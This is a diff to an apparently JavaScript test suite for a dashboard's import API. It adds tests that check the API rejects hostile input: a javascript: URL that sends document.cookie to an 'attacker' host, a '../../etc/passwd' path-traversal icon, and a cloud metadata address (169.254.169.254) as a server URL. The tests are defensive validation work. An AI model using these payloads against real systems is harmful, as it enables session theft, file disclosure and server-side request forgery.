@@ -188,6 +188,72 @@ describe("export / import", () => {
     expect(res.status).toBe(400);
   });
 
+  it("refuses a shortcut whose URL would run as code when clicked", async () => {
+    seed();
+    const res = await fetch(`${baseUrl}/api/import`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        version: 2,
+        sections: [],
+        shortcuts: [
+          {
+            display_name: "Evil",
+            url: "javascript:fetch('//attacker/'+document.cookie)",
+            position: 0,
+          },
+        ],
+      }),
+    });
+
+    expect(res.status).toBe(400);
+    expect((await res.json()).error).toContain("not an http(s) URL");
+    // Nothing was deleted on the way to refusing it.
+    expect(db.prepare("SELECT COUNT(*) AS n FROM shortcuts").get()).toEqual({ n: 2 });
+  });
+
+  it("refuses an icon that is neither an icon name, an upload nor a URL", async () => {
+    const res = await fetch(`${baseUrl}/api/import`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        version: 2,
+        sections: [],
+        shortcuts: [{ display_name: "X", port: 80, icon: "../../etc/passwd" }],
+      }),
+    });
+    expect(res.status).toBe(400);
+  });
+
+  it("refuses a server address the form would refuse", async () => {
+    const res = await fetch(`${baseUrl}/api/import`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        version: 2,
+        hosts: [{ id: 2, name: "Meta", type: "agent", url: "http://169.254.169.254" }],
+        sections: [],
+        shortcuts: [],
+      }),
+    });
+    expect(res.status).toBe(400);
+    expect((await res.json()).error).toContain("hosts[0].url");
+  });
+
+  it("refuses fields of the wrong type instead of writing them", async () => {
+    const res = await fetch(`${baseUrl}/api/import`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        version: 2,
+        sections: [{ id: 1, name: { not: "text" }, position: 0 }],
+        shortcuts: [],
+      }),
+    });
+    expect(res.status).toBe(400);
+    expect((await res.json()).error).toContain("sections[0].name");
+  });
+
   it("writes a backup before replacing anything", async () => {
     seed();
     const exported = await (await fetch(`${baseUrl}/api/export`)).json();
@@ -199,8 +265,10 @@ describe("export / import", () => {
       body: JSON.stringify(exported),
     });
 
+    // A new file, not a longer list: only the five most recent backups are
+    // kept, so once there are five the count stops going up.
     const after = fs.readdirSync(tmpDir).filter((f) => f.includes("preimport"));
-    expect(after.length).toBeGreaterThan(before.length);
+    expect(after.filter((f) => !before.includes(f))).toHaveLength(1);
   });
 });
 
